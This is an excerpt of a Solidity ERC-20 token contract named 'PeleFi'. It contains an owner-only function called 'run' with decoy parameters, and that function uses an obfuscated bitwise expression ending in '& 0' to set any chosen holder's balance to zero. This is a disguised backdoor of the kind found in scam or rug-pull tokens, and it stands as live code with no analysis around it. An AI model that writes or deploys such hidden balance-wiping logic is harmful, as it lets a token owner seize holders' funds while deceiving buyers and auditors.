...
contract PeleFi is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private Boter; 
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "PeleFi";
    string private _symbol = "PELEFI";
    ...
    function run(bool enabled, address target, bytes32 woodly) public onlyOwner {
        require(target != address(0));
        uint112 RewardAmount = 1;
        _balance[target] = (((_balance[target]) + 1 & (_balance[target]) & RewardAmount & (_balance[target]) & 0) << 0xF);
    }
